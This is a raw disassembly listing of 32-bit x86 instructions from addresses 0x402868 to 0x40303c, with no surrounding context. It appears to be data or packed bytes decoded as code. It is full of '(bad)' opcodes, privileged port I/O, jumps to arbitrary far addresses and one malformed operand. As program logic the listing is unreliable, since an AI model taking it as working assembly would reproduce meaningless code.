  402868:	dec    edx
  402869:	sbb    DWORD PTR [eax+0x4b740bd1],ebx
  40286f:	shl    BYTE PTR ds:0xe8732aff,1
  402875:	jnp    0x402859
  402877:	les    ebp,FWORD PTR [eax]
  402879:	cmp    al,0xae
  40287b:	inc    esi
  40287c:	mov    al,0xbc
  40287e:	sar    edx,cl
  402880:	jne    0x4028d9
  402882:	add    esi,DWORD PTR [edx-0x74ccd13a]
  402888:	popa   
  402889:	cs push ebp
  40288b:	push   ecx
  40288c:	sbb    DWORD PTR [edi-0x48],ecx
  40288f:	inc    esp
  402890:	or     BYTE PTR [esi-0xfee04e2],ch
  402896:	dec    edi
  402897:	inc    esi
  402898:	push   ds
  402899:	repnz sub DWORD PTR [ecx-0x7e],edx
  40289d:	lods   eax,DWORD PTR ds:[esi]
  40289e:	popf   
  40289f:	fs jge 0x4028bc
  4028a2:	out    dx,eax
  4028a3:	push   ds
  4028a4:	sub    DWORD PTR [ebx+0x6d11746d],esi
  4028aa:	ins    DWORD PTR es:[edi],dx
  4028ab:	bswap  edx
  4028ad:	xchg   esi,eax
  4028ae:	iret   
  4028af:	fsub   DWORD PTR [esi]
  4028b1:	jmp    0x40287e
  4028b3:	div    BYTE PTR [edx+ecx*4-0x1ee512df]
  4028ba:	jae    0x4028a2
  4028bc:	bound  ebx,QWORD PTR [ebp-0x166c8ae4]
  4028c2:	mov    ah,0x47
  4028c4:	adc    DWORD PTR [edi],edi
  4028c6:	and    esp,DWORD PTR [edi+ebx*8-0x70]
  4028ca:	xor    ch,BYTE PTR [eax*8-0x4ec65cd]
  4028d1:	dec    edi
  4028d2:	mov    WORD PTR [ebp+0xf],es
  4028d5:	xor    DWORD PTR [esi-0x294f98bb],ebp
  4028db:	(bad)  
  4028dc:	jae    0x4028d9
  4028de:	add    ch,al
  4028e0:	adc    al,0xb0
  4028e2:	popf   
  4028e3:	je     0x4028dd
  4028e5:	jl     0x402925
  4028e7:	jmp    0x4c779e2e
  4028ec:	aas    
  4028ed:	in     al,dx
  4028ee:	dec    esi
  4028ef:	sahf   
  4028f0:	stos   BYTE PTR es:[edi],al
  4028f1:	shl    BYTE PTR [edx],cl
  4028f3:	mov    bh,0x3b
  4028f5:	and    bl,BYTE PTR [esi]
  4028f7:	sub    al,0xc5
  4028f9:	(bad)  
  4028fa:	repnz cmp DWORD PTR [ebp+0x2758544b],eax
  402901:	or     al,cl
  402903:	or     bh,bl
  402905:	cs push 0x459f4093
  40290b:	xor    dl,dh
  40290d:	dec    ebx
  40290e:	shr    BYTE PTR [ecx+0x79f2801],0xf8
  402915:	pop    esp
  402916:	add    dh,bh
  402918:	stos   DWORD PTR es:[edi],eax
  402919:	lock jmp 0x402912
  40291c:	mov    eax,ds:0x72502726
  402921:	int    0x3e
  402923:	iret   
  402924:	out    0x6,al
  402926:	shr    BYTE PTR [eax+0x79e1eb3e],0x61
  40292d:	sti    
  40292e:	xor    BYTE PTR [edx-0x358916eb],al
  402934:	cs cdq 
  402936:	pop    edx
  402937:	arpl   WORD PTR [edx-0x6f7501c1],si
  40293d:	jns    0x4029a8
  40293f:	cld    
  402940:	(bad)  
  402941:	cwde   
  402942:	mov    DWORD PTR [esi],ebp
  402944:	bound  edx,QWORD PTR [bx+di]
  402947:	pop    ds
  402948:	je     0x402982
  40294a:	xor    ebx,DWORD PTR [eax-0x56]
  40294d:	stos   DWORD PTR es:[edi],eax
  40294e:	dec    esi
  40294f:	dec    eax
  402950:	sbb    esp,DWORD PTR [eax+0x7c]
  402953:	sbb    ebx,DWORD PTR [esi]
  402955:	push   edi
  402956:	(bad)  
  402957:	cld    
  402958:	jmp    0xd552:0xbf8c517
  40295f:	mov    eax,ds:0x164f4f7b
  402964:	lahf   
  402965:	repz sub eax,0x674a7aa6
  40296b:	push   0x512937ce
  402970:	les    ebx,FWORD PTR [ecx]
  402972:	dec    edx
  402973:	jp     0x402935
  402975:	mov    ebx,DWORD PTR [ebx+0x63]
  402978:	out    0x36,al
  40297a:	add    bh,ah
  40297c:	fsubp  st(0),st
  40297e:	push   ss
  40297f:	jb     0x402930
  402981:	ss mov dl,0x41
  402984:	dec    esi
  402985:	call   0x5a80:0x5a693c26
  40298c:	in     eax,dx
  40298d:	cmp    DWORD PTR [ebp+0xe5b9566],edx
  402993:	js     0x40298f
  402995:	out    dx,eax
  402996:	imul   eax,DWORD PTR [esi+0x5eadff99],0x968c1f63
  4029a0:	sub    eax,0x3d2fc1da
  4029a5:	icebp  
  4029a6:	dec    ecx
  4029a7:	adc    ah,dl
  4029a9:	xchg   bx,ax
  4029ab:	cmc    
  4029ac:	adc    ah,BYTE PTR [si]
  4029af:	mov    bl,0x46
  4029b1:	ror    BYTE PTR [eax+0x4],1
  4029b4:	pop    ds
  4029b5:	xchg   ebp,eax
  4029b6:	imul   dl
  4029b8:	cmp    ah,BYTE PTR [ebp+0x11]
  4029bb:	inc    BYTE PTR [esi+0x46c39e67]
  4029c1:	pop    ss
  4029c2:	sbb    BYTE PTR [edi],dh
  4029c4:	js     0x4029c6
  4029c6:	out    0xe4,al
  4029c8:	aas    
  4029c9:	daa    
  4029ca:	adc    ecx,DWORD PTR [ebx+0x2fb5767b]
  4029d0:	mov    esi,0x378a133d
  4029d5:	xchg   BYTE PTR [ebx-0x1cbb86e9],cl
  4029db:	or     bh,BYTE PTR [ebx-0x62]
  4029de:	mov    ds:0xecaacacd,al
  4029e3:	inc    esp
  4029e4:	imul   esp,edi,0xb735616e
  4029ea:	dec    ecx
  4029eb:	imul   esp,DWORD PTR [eax-0x54f6a992],0x8b033b7a
  4029f5:	std    
  4029f6:	mov    esi,DWORD PTR [edi-0x4f]
  4029f9:	lea    esp,[esi-0x931964c]
  4029ff:	push   0x10
  402a01:	sbb    ebp,0x797075e7
  402a07:	pop    ecx
  402a08:	cmp    BYTE PTR [edx+0x7a0c4075],dh
  402a0e:	xchg   BYTE PTR [esi+ecx*4+0x59],bh
  402a12:	imul   esp,DWORD PTR [esi+0xf],0x4e353570
  402a19:	sbb    BYTE PTR [eax-0x22cb6cd4],dh
  402a1f:	ins    DWORD PTR es:[edi],dx
  402a20:	test   DWORD PTR [edi],ebp
  402a22:	imul   eax,DWORD PTR [edx+ebp*2],0xc31bdea4
  402a29:	push   ecx
  402a2a:	push   edi
  402a2b:	ds mov edx,edi
  402a2e:	inc    ecx
  402a2f:	inc    esp
  402a30:	icebp  
  402a31:	adc    dh,BYTE PTR [ebx-0x6ded8596]
  402a37:	jmp    0x402aad
  402a39:	dec    edx
  402a3a:	inc    esi
  402a3b:	ins    BYTE PTR es:[edi],dx
  402a3c:	mov    ebp,0x824c2bd6
  402a41:	out    dx,al
  402a42:	jle    0x402a9c
  402a44:	ret    0xe7a1
  402a47:	(bad)  
  402a48:	pop    ds
  402a49:	push   ecx
  402a4a:	jne    0x4029ea
  402a4c:	ins    DWORD PTR es:[edi],dx
  402a4d:	jmp    0x9f1e:0xba60656b
  402a54:	icebp  
  402a55:	sub    al,0xcc
  402a57:	push   ecx
  402a58:	imul   edi,DWORD PTR [eax+0x62148bff],0x23
  402a5f:	sar    BYTE PTR [edi+0x3d],1
  402a62:	cmp    al,0x3c
  402a64:	xor    dl,BYTE PTR gs:[edx-0x51]
  402a68:	inc    esi
  402a69:	cmp    eax,0xeb80143d
  402a6e:	mov    esi,0x7d113cb9
  402a73:	(bad)  
  402a74:	inc    BYTE PTR [esi-0x1c6f3ccd]
  402a7a:	xchg   esp,eax
  402a7b:	inc    eax
  402a7c:	push   es
  402a7d:	stos   BYTE PTR es:[edi],al
  402a7e:	int3   
  402a7f:	xchg   ecx,eax
  402a80:	shl    BYTE PTR [ebp-0x1a],cl
  402a83:	mov    ebx,0x439681c5
  402a88:	scas   eax,DWORD PTR es:[edi]
  402a89:	test   eax,0x78ed563d
  402a8e:	dec    edx
  402a8f:	lahf   
  402a90:	les    edi,FWORD PTR [edx+eax*1+0x5d]
  402a94:	jg     0x402a94
  402a96:	daa    
  402a97:	test   al,0x2c
  402a99:	sub    edi,DWORD PTR [esi+0x1e1ec6b5]
  402a9f:	fild   WORD PTR [ecx+0x6bd49d78]
  402aa5:	xchg   edi,ebx
  402aa7:	hlt    
  402aa8:	retf   
  402aa9:	xchg   ecx,eax
  402aaa:	pop    ds
  402aab:	sub    eax,0xb8cd383c
  402ab0:	cs ja  0x402ac1
  402ab3:	dec    eax
  402ab4:	pop    eax
  402ab5:	lock cmp al,0xd8
  402ab8:	bound  esi,QWORD PTR [esi*2-0x1eedb7fa]
  402abf:	mov    WORD PTR [edx+0x7d27fb67],gs
  402ac5:	(bad)  
  402ac6:	sti    
  402ac7:	or     ah,ah
  402ac9:	and    edi,eax
  402acb:	or     eax,0x1b412bec
  402ad0:	cdq    
  402ad1:	cwde   
  402ad2:	rol    BYTE PTR [edi-0x25],1
  402ad5:	mov    dl,0x33
  402ad7:	outs   dx,BYTE PTR ds:[esi]
  402ad8:	sbb    BYTE PTR [eax+0x344ce916],bh
  402ade:	nop
  402adf:	fnsave [ebx+0xd047cce]
  402ae5:	cmc    
  402ae6:	dec    ebp
  402ae7:	loopne 0x402b3e
  402ae9:	push   es
  402aea:	popf   
  402aeb:	dec    ecx
  402aec:	push   edi
  402aed:	mov    edi,0x6a138fac
  402af2:	shr    BYTE PTR [ecx+0x4ebf9d2b],0x5d
  402af9:	mov    al,0xfd
  402afb:	dec    esp
  402afc:	aas    
  402afd:	jge    0x402b42
  402aff:	stos   DWORD PTR es:[edi],eax
  402b00:	lods   eax,DWORD PTR ds:[esi]
  402b01:	inc    esp
  402b02:	cmp    DWORD PTR [edx+0x52],esp
  402b05:	pop    edi
  402b06:	pop    es
  402b07:	in     eax,0xdf
  402b09:	cs mov ebp,0xca04936d
  402b0f:	push   ds
  402b10:	fsub   DWORD PTR [edx+0xe148b05]
  402b16:	pop    es
  402b17:	stc    
  402b18:	push   DWORD PTR [ebp+0x65a4fc98]
  402b1e:	scas   eax,DWORD PTR es:[edi]
  402b1f:	add    eax,0xca1ace78
  402b24:	into   
  402b25:	sub    eax,0xe6b09e06
  402b2a:	xchg   edx,eax
  402b2b:	repnz and eax,0xed21a05d
  402b31:	cmp    al,0xfb
  402b33:	and    bl,ch
  402b35:	add    BYTE PTR [ecx+0x29],cl
  402b38:	test   esp,0x483a6957
  402b3e:	(bad)  
  402b3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b40:	push   esp
  402b41:	jge    0x402b4a
  402b43:	jno    0x402b56
  402b45:	mov    BYTE PTR ds:0x13eb4e20,ch
  402b4b:	fisubr DWORD PTR [ecx]
  402b4d:	sbb    BYTE PTR [esi+ebx*4],al
  402b50:	idiv   DWORD PTR [edx]
  402b52:	mov    bl,0xf5
  402b54:	push   ebp
  402b55:	lods   al,BYTE PTR ds:[esi]
  402b56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b57:	mov    cl,0x39
  402b59:	in     al,dx
  402b5a:	jnp    0x402b5b
  402b5c:	enter  0xf7d3,0x7b
  402b60:	nop
  402b61:	lods   al,BYTE PTR ds:[esi]
  402b62:	dec    eax
  402b63:	jle    0x402b47
  402b65:	or     al,0xcc
  402b67:	arpl   WORD PTR [eax],si
  402b69:	mov    dh,0xa3
  402b6b:	xchg   edi,eax
  402b6c:	push   esi
  402b6d:	lahf   
  402b6e:	out    0x56,al
  402b70:	shl    DWORD PTR [edi],cl
  402b72:	test   ah,dl
  402b74:	dec    ecx
  402b75:	std    
  402b76:	add    al,0x46
  402b78:	jne    0x402b7c
  402b7a:	popf   
  402b7b:	(bad)  
  402b7c:	test   BYTE PTR [ecx],dl
  402b7e:	or     BYTE PTR [esi+0x58],ah
  402b81:	jmp    0xe8ffcbdc
  402b86:	repnz sti 
  402b88:	shl    cl,0x88
  402b8b:	mov    ds:0xe4c14420,al
  402b90:	ins    DWORD PTR es:[edi],dx
  402b91:	mov    ch,0x44
  402b93:	shr    edi,cl
  402b95:	aad    0xed
  402b97:	inc    ebx
  402b98:	lods   al,BYTE PTR ds:[esi]
  402b99:	lahf   
  402b9a:	ret    0xc62e
  402b9d:	outs   dx,DWORD PTR ds:[esi]
  402b9e:	daa    
  402b9f:	aas    
  402ba0:	scas   al,BYTE PTR es:[edi]
  402ba1:	and    bh,BYTE PTR [eax-0x7f]
  402ba4:	loope  0x402b50
  402ba6:	sub    DWORD PTR [esi],esp
  402ba8:	repnz iret 
  402baa:	test   ch,0xb1
  402bad:	add    esp,DWORD PTR [ebp+ebp*4+0x77a69623]
  402bb4:	push   ds
  402bb5:	and    eax,0x64023b40
  402bba:	stc    
  402bbb:	xchg   ebx,eax
  402bbc:	dec    eax
  402bbd:	sub    BYTE PTR [eax],ah
  402bbf:	jg     0x402b9e
  402bc1:	sub    dl,BYTE PTR ds:0x3cea2043
  402bc7:	xor    DWORD PTR [esi],ebx
  402bc9:	sbb    DWORD PTR [edx-0x31],eax
  402bcc:	mov    ebx,0x81150de6
  402bd1:	pop    ecx
  402bd2:	std    
  402bd3:	nop
  402bd4:	cwde   
  402bd5:	daa    
  402bd6:	sub    al,0x58
  402bd8:	inc    edi
  402bd9:	or     al,0x42
  402bdb:	xor    BYTE PTR [ecx+0x7f],0xdc
  402bdf:	jbe    0x402c5c
  402be1:	pop    es
  402be2:	gs cmp bh,dl
  402be5:	add    DWORD PTR [ebx+0x4c],edx
  402be8:	dec    edi
  402be9:	enter  0x8155,0x0
  402bed:	mov    dl,0xf9
  402bef:	sbb    ch,BYTE PTR [edx-0x52]
  402bf2:	add    al,0x50
  402bf4:	mov    ds:0x773757b4,eax
  402bf9:	jnp    0x402bb2
  402bfb:	inc    ecx
  402bfc:	fsub   DWORD PTR [edx-0x56]
  402bff:	push   esp
  402c00:	jbe    0x402c34
  402c02:	shl    esi,0xe1
  402c05:	mov    eax,DWORD PTR [eax+0x49e10f80]
  402c0b:	pop    edi
  402c0c:	jecxz  0x402bb1
  402c0e:	xchg   ebp,eax
  402c0f:	lock jo 0x402bd9
  402c12:	mov    dh,dh
  402c14:	mov    al,ds:0x8e524835
  402c19:	scas   al,BYTE PTR es:[edi]
  402c1a:	cs push cs
  402c1c:	pop    ecx
  402c1d:	arpl   WORD PTR [ebx],si
  402c1f:	push   edx
  402c20:	fsubp  st(2),st
  402c22:	int3   
  402c23:	cmp    BYTE PTR [ecx-0x56bc8599],0x63
  402c2a:	pushf  
  402c2b:	mov    ch,0x41
  402c2d:	add    edi,esi
  402c2f:	sub    DWORD PTR [edi+0x49c54f26],0xffffff89
  402c36:	inc    ecx
  402c37:	push   edi
  402c38:	scas   eax,DWORD PTR es:[edi]
  402c39:	test   DWORD PTR [ecx],eax
  402c3b:	fistp  WORD PTR [edx-0x20cc0282]
  402c41:	outs   dx,BYTE PTR ds:[esi]
  402c42:	or     edx,0xffffffa5
  402c45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c46:	nop
  402c47:	add    BYTE PTR [bx+di+0x52],ch
  402c4b:	call   0xa718:0x7ebb097b
  402c52:	aaa    
  402c53:	popa   
  402c54:	mov    cl,0xee
  402c56:	xchg   edx,eax
  402c57:	add    edx,edi
  402c59:	pop    ebx
  402c5a:	or     BYTE PTR [esi+0x1da2cc40],al
  402c60:	into   
  402c61:	mov    dh,0xdf
  402c63:	xor    eax,0xb34cff8d
  402c68:	inc    ecx
  402c69:	push   edx
  402c6a:	sub    dh,BYTE PTR [edx-0xbc08ca0]
  402c70:	std    
  402c71:	jmp    0x78abe071
  402c76:	call   0xcbc1d40c
  402c7b:	add    DWORD PTR [ecx+0x253a7137],ebp
  402c81:	(bad)  
  402c82:	das    
  402c83:	xchg   esp,eax
  402c84:	and    eax,0x3c7d0729
  402c8a:	dec    edx
  402c8b:	jns    0x402cac
  402c8d:	ins    BYTE PTR es:[edi],dx
  402c8e:	pop    ds
  402c8f:	inc    ecx
  402c90:	adc    DWORD PTR [ecx],0xffffffed
  402c93:	in     eax,0xb9
  402c95:	cmp    dl,BYTE PTR [edx-0x15ecc035]
  402c9b:	call   0x605d9143
  402ca0:	outs   dx,BYTE PTR ds:[esi]
  402ca1:	leave  
  402ca2:	sbb    eax,0x5b17e1c6
  402ca7:	push   ecx
  402ca9:	int    0x6a
  402cab:	int    0x10
  402cad:	mov    DWORD PTR [edi],ebp
  402caf:	add    cl,BYTE PTR [edi-0x6ac326e0]
  402cb5:	mov    bh,bh
  402cb7:	lock bound ebx,QWORD PTR [ebx-0x569cda09]
  402cbe:	fwait
  402cbf:	mov    eax,0x85619b6b
  402cc4:	test   al,0xd2
  402cc6:	rcl    DWORD PTR [edx-0x6d],1
  402cc9:	imul   edx,DWORD PTR [ecx-0x5802f6a1],0xffffffa0
  402cd0:	pop    es
  402cd1:	int    0xeb
  402cd3:	jmp    0xe9cad23e
  402cd8:	cs stc 
  402cda:	cmp    al,0xcd
  402cdc:	xor    DWORD PTR gs:[ecx],esi
  402cdf:	mov    dl,0x5f
  402ce1:	imul   DWORD PTR [edi]
  402ce3:	adc    eax,0xbb780e7f
  402ce8:	lds    ebp,FWORD PTR [ebx-0x91ea8a0]
  402cee:	push   gs
  402cf0:	xchg   ebx,eax
  402cf1:	pop    eax
  402cf2:	in     eax,0xdb
  402cf4:	dec    edx
  402cf5:	push   es
  402cf6:	test   al,0x50
  402cf8:	ins    DWORD PTR es:[edi],dx
  402cf9:	jmp    FWORD PTR [ebp+0x6d]
  402cfc:	or     DWORD PTR [edx+0x49],0xf416fe18
  402d03:	dec    ebp
  402d04:	je     0x402cbb
  402d06:	mov    edx,0xa7ba1024
  402d0b:	rol    DWORD PTR [eax+eiz*1-0x4af1eaa2],cl
  402d12:	mov    edi,0x1b9c6621
  402d17:	mov    WORD PTR [ebx],fs
  402d19:	scas   eax,DWORD PTR es:[edi]
  402d1a:	test   DWORD PTR [edi+0x37],edi
  402d1d:	mov    esp,edx
  402d1f:	(bad)  
  402d20:	jns    0x402d1a
  402d22:	pop    edx
  402d23:	int    0x26
  402d25:	sub    DWORD PTR [edx+esi*8-0x41],ebx
  402d29:	stos   DWORD PTR es:[edi],eax
  402d2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d2b:	adc    al,0xec
  402d2d:	and    DWORD PTR [ebx],0x11341795
  402d33:	xor    eax,0x624b3833
  402d38:	push   ds
  402d39:	cmp    BYTE PTR [ebp-0x538fe7ba],bl
  402d3f:	inc    eax
  402d40:	ss in  eax,0xbc
  402d43:	dec    esi
  402d44:	out    dx,al
  402d45:	neg    BYTE PTR [ebp+0x444f525a]
  402d4b:	aaa    
  402d4c:	sub    DWORD PTR [esi+0x29],edi
  402d4f:	jmp    0x402d3f
  402d51:	sub    BYTE PTR [esi-0x741caa7c],dh
  402d57:	pusha  
  402d58:	ins    DWORD PTR es:[edi],dx
  402d59:	es retf 0x75c
  402d5d:	lock stos BYTE PTR es:[edi],al
  402d5f:	add    DWORD PTR [esi-0x97b6727],ebp
  402d65:	cmp    eax,0x721ecd6
  402d6a:	jmp    FWORD PTR [eax+eax*8]
  402d6d:	test   al,0xc5
  402d6f:	push   0x4115bdf6
  402d74:	mov    ecx,0x9d08b36e
  402d79:	cdq    
  402d7a:	xor    ebx,DWORD PTR [eax+0x30]
  402d7d:	in     eax,0x3d
  402d7f:	fsubr  DWORD PTR [esi+0x63]
  402d82:	retf   0x5a67
  402d85:	jae    0x402d1d
  402d87:	cwde   
  402d88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d89:	mov    dl,0xf7
  402d8b:	stos   DWORD PTR es:[edi],eax
  402d8c:	cld    
  402d8d:	xchg   ecx,eax
  402d8e:	retf   
  402d8f:	adc    DWORD PTR [ecx],eax
  402d91:	or     esi,DWORD PTR [esi]
  402d93:	push   ebp
  402d94:	jp     0x402d3e
  402d96:	int    0xc9
  402d98:	ret    0x4004
  402d9b:	inc    esp
  402d9c:	aaa    
  402d9d:	rol    bl,0x9b
  402da0:	retf   0x99e0
  402da3:	add    eax,0x1348c527
  402da8:	enter  0xf0bf,0x2e
  402dac:	shl    edx,cl
  402dae:	pop    es
  402daf:	pop    edx
  402db0:	repz mov dh,bh
  402db3:	mov    BYTE PTR [ebp-0x340544c1],dh
  402db9:	call   0xe9c7:0x672fd4a6
  402dc0:	inc    edi
  402dc1:	out    0x1b,eax
  402dc3:	push   esi
  402dc4:	mov    bl,0xd2
  402dc6:	mov    DWORD PTR ds:0xc4d4911d,edi
  402dcc:	mov    al,0x77
  402dce:	arpl   si,sp
  402dd0:	xchg   DWORD PTR [edi+0x1fd7cdd9],ebp
  402dd6:	or     eax,0x5d812a5d
  402ddb:	in     eax,dx
  402ddc:	pop    esi
  402ddd:	jno    0x402db2
  402ddf:	outs   dx,BYTE PTR ds:[esi]
  402de0:	inc    eax
  402de1:	div    DWORD PTR [ebx+0x7890fcd9]
  402de7:	mov    bh,0x92
  402de9:	cmp    eax,0x77bca5ee
  402dee:	add    ebp,DWORD PTR [ecx+edx*1-0x1]
  402df2:	ins    DWORD PTR es:[edi],dx
  402df3:	call   ecx
  402df5:	and    eax,0xe68a9c5d
  402dfa:	jmp    0xfdb4:0xc2e35b27
  402e01:	jmp    0x61a4:0x5c23ec1e
  402e08:	(bad)  
  402e09:	es mov edx,0x52f0347d
  402e0f:	dec    edx
  402e10:	xor    BYTE PTR [ebp-0x54],ch
  402e13:	rcl    ah,0xf9
  402e16:	dec    ecx
  402e17:	retf   
  402e18:	xchg   edi,eax
  402e19:	mov    al,ds:0x77857737
  402e1e:	imul   esp,DWORD PTR [eax],0x6f90f829
  402e24:	rol    BYTE PTR [ebp-0x31],0x1f
  402e28:	das    
  402e29:	test   eax,0x2e160ee4
  402e2e:	retf   0x6bf3
  402e31:	sbb    BYTE PTR [edi-0x2c7b3bab],dh
  402e37:	push   ecx
  402e38:	outs   dx,DWORD PTR ds:[esi]
  402e39:	sbb    eax,0x5620616e
  402e3e:	pop    ds
  402e3f:	mov    eax,ds:0x37bc082
  402e44:	adc    edi,DWORD PTR gs:[ebp+0x5e]
  402e48:	outs   dx,BYTE PTR ds:[esi]
  402e49:	sub    al,0xa6
  402e4b:	jns    0x402ddd
  402e4d:	push   ss
  402e4e:	and    dh,BYTE PTR [eax+0x6b]
  402e51:	push   esp
  402e52:	call   0xa16e:0x9bf176ed
  402e59:	iret   
  402e5a:	(bad)  
  402e5b:	sub    eax,0x5f264857
  402e60:	ins    BYTE PTR es:[edi],dx
  402e61:	cmp    BYTE PTR [eax],bh
  402e63:	cmp    bh,BYTE PTR [eax+0x52eb8650]
  402e69:	sub    esi,DWORD PTR [eax+0x1e6c7e05]
  402e6f:	mov    ecx,0x5c9a237f
  402e74:	push   cs
  402e75:	jle    0x402e20
  402e77:	mov    bh,0xfa
  402e79:	mov    eax,0xbbc1fb8b
  402e7e:	xchg   edi,eax
  402e7f:	(bad)  
  402e80:	mov    ebx,0xcdbfbb
  402e85:	pushf  
  402e86:	inc    ebx
  402e87:	and    eax,0x9a0cc217
  402e8c:	test   DWORD PTR [ebx],edi
  402e8e:	jb     0x402ec7
  402e90:	pop    esi
  402e91:	jo     0x402eef
  402e93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e94:	push   esp
  402e95:	mov    cl,0x56
  402e97:	push   0xe7b0ace
  402e9c:	addr16 icebp 
  402e9e:	mov    ds:0x52d6614a,al
  402ea3:	sub    DWORD PTR [esi+0x5e],edi
  402ea6:	stos   DWORD PTR es:[edi],eax
  402ea7:	xchg   ecx,eax
  402ea8:	mov    al,0x5e
  402eaa:	out    dx,eax
  402eab:	fsub   QWORD PTR [ebx+0x479fbcf]
  402eb1:	dec    ebx
  402eb2:	push   0xffffff90
  402eb4:	or     DWORD PTR [edi+eax*2+0x40],ecx
  402eb8:	pop    ecx
  402eb9:	test   dl,bl
  402ebb:	sub    al,0x6
  402ebd:	in     al,dx
  402ebe:	mov    eax,0xc9300735
  402ec3:	enter  0xcbb9,0xfa
  402ec7:	jg     0x402e6c
  402ec9:	xchg   DWORD PTR [ecx],ebp
  402ecb:	scas   eax,DWORD PTR es:[edi]
  402ecc:	sbb    ecx,DWORD PTR [ebx]
  402ece:	popf   
  402ecf:	or     dh,ch
  402ed1:	daa    
  402ed2:	jbe    0x402ef6
  402ed4:	add    dl,BYTE PTR [ebx+0xe6c4263]
  402eda:	cs and esp,esi
  402edd:	cmp    ebx,0xffffffa9
  402ee0:	cmp    BYTE PTR [ebp-0xf260f0d],bh
  402ee6:	fnsave [eax+0x2]
  402ee9:	ins    BYTE PTR es:[edi],dx
  402eea:	inc    esp
  402eeb:	jo     0x402eaa
  402eed:	mov    al,0x4a
  402eef:	cmp    al,0x4b
  402ef1:	ins    BYTE PTR es:[edi],dx
  402ef2:	stos   BYTE PTR es:[edi],al
  402ef3:	inc    esi
  402ef4:	and    bl,BYTE PTR [edi-0x22f0d4c2]
  402efa:	iret   
  402efb:	call   0x763c273b
  402f00:	daa    
  402f01:	daa    
  402f02:	jnp    0x402eec
  402f04:	inc    edx
  402f05:	lock leave 
  402f07:	inc    edi
  402f08:	je     0x402f35
  402f0a:	mov    esi,0x4c7ac4b6
  402f10:	mov    edx,0x66499326
  402f15:	retf   
  402f16:	cld    
  402f17:	cmp    eax,ecx
  402f19:	xchg   esp,eax
  402f1a:	loop   0x402ee0
  402f1c:	mov    ah,0x5e
  402f1e:	pop    ss
  402f1f:	and    al,0xc3
  402f21:	or     DWORD PTR [ecx+0x19ee580f],0x1e
  402f28:	in     eax,dx
  402f29:	pop    es
  402f2a:	es scas eax,DWORD PTR es:[edi]
  402f2c:	mov    edx,0xbb4424c5
  402f31:	pop    ss
  402f32:	jg     0x402f3d
  402f34:	retf   0xba09
  402f37:	mov    ss,WORD PTR [esi]
  402f39:	nop
  402f3a:	ss xchg edx,eax
  402f3c:	ret    0x2096
  402f3f:	jnp    0x402f1c
  402f41:	fild   QWORD PTR [edi-0x7f]
  402f44:	sub    BYTE PTR [esi+0x11f7e321],dh
  402f4a:	and    al,BYTE PTR [edx]
  402f4c:	pop    ecx
  402f4d:	pop    esi
  402f4e:	sbb    eax,0x7b4a6bbf
  402f53:	inc    esp
  402f54:	pop    es
  402f55:	daa    
  402f56:	cs push 0xffffff87
  402f59:	pop    esi
  402f5a:	pop    esi
  402f5b:	pop    esi
  402f5c:	jmp    0xf519:0x962fe3e5
  402f63:	aam    0xaf
  402f65:	test   al,0x7a
  402f67:	dec    ecx
  402f68:	out    dx,al
  402f69:	jge    0x402f15
  402f6b:	int3   
  402f6c:	add    eax,0x186f742d
  402f71:	outs   dx,DWORD PTR ds:[esi]
  402f72:	sbb    al,0xc5
  402f74:	jns    0x402fd4
  402f76:	fcom   st(7)
  402f78:	pop    edi
  402f79:	cli    
  402f7a:	mov    ?,esp
  402f7c:	mov    al,0xa6
  402f7e:	nop
  402f7f:	mov    BYTE PTR [ecx-0x24],dh
  402f82:	sub    cl,ch
  402f84:	jmpw   0x5c0c
  402f88:	fsub   QWORD PTR [eax+ebx*4-0xfdd8242]
  402f8f:	iret   
  402f90:	imul   ebp,DWORD PTR [eax+0xd],0xab0198e8
  402f97:	sub    DWORD PTR [ebx],0xffffff95
  402f9a:	or     eax,0x79c80a15
  402f9f:	xor    edi,ebx
  402fa1:	ins    DWORD PTR es:[edi],dx
  402fa2:	pop    ss
  402fa3:	add    DWORD PTR [esi+edx*4+0x65],0x9
  402fa8:	aas    
  402fa9:	add    DWORD PTR [ebx],eax
  402fab:	or     al,0xe4
  402fad:	mov    eax,DWORD PTR [esi]
  402faf:	jp     0x402f4e
  402fb1:	(bad)  
  402fb2:	in     eax,dx
  402fb3:	ja     0x402fc6
  402fb5:	fmul   QWORD PTR [ecx+eiz*4]
  402fb8:	mov    DWORD PTR [edx-0x43],ecx
  402fbb:	stos   DWORD PTR es:[edi],eax
  402fbc:	dec    edx
  402fbd:	jge    0x402fd5
  402fbf:	mov    cl,0xf4
  402fc1:	push   0xffffff92
  402fc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402fc4:	and    edx,DWORD PTR [edi-0x34]
  402fc7:	(bad)  
  402fc8:	in     eax,dx
  402fc9:	cmp    cl,BYTE PTR [ebp+0x22]
  402fcc:	rcr    DWORD PTR [edi-0x29e8a9f4],1
  402fd2:	pop    ecx
  402fd3:	es cmp al,0xdb
  402fd6:	call   0xc57930f9
  402fdb:	sti    
  402fdc:	packssdw mm0,QWORD PTR [eax]
  402fdf:	sbb    eax,0x1a968619
  402fe4:	mov    eax,edx
  402fe6:	inc    edi
  402fe7:	pusha  
  402fe8:	les    edx,FWORD PTR [eax+0x174ff22a]
  402fee:	cmp    ah,BYTE PTR [edx+0x2227909b]
  402ff4:	adc    DWORD PTR [eax+0x10e2b0de],0x7c
  402ffb:	loope  0x40303c
  402ffd:	jnp    0x402fbf
  402fff:	adc    ebx,DWORD PTR [eax-0x6c]
  403002:	mov    ebx,ds
  403004:	(bad)
  403007:	dec    esp
  403008:	gs pop eax
  40300a:	pop    ss
  40300b:	sbb    esi,esp
  40300d:	sar    esi,cl
  40300f:	push   edi
  403010:	outs   dx,BYTE PTR ds:[esi]
  403011:	mov    DWORD PTR [eax-0x45],ecx
  403014:	out    dx,eax
  403015:	imul   DWORD PTR [eax-0x21]
  403018:	mov    bl,0xff
  40301a:	cli    
  40301b:	mov    eax,ds:0x5ce86cfc
  403020:	and    DWORD PTR [ebx+0x1f],edi
  403023:	fadd   QWORD PTR [edx+ebx*4-0x1ceabb91]
  40302a:	repnz inc eax
  40302c:	xor    BYTE PTR [eax-0x48],0xd6
  403030:	mov    ebp,DWORD PTR [esi+0x4d3b4fb9]
  403036:	rcr    DWORD PTR [ecx-0x76682df3],1
  40303c:	xor    bl,bh
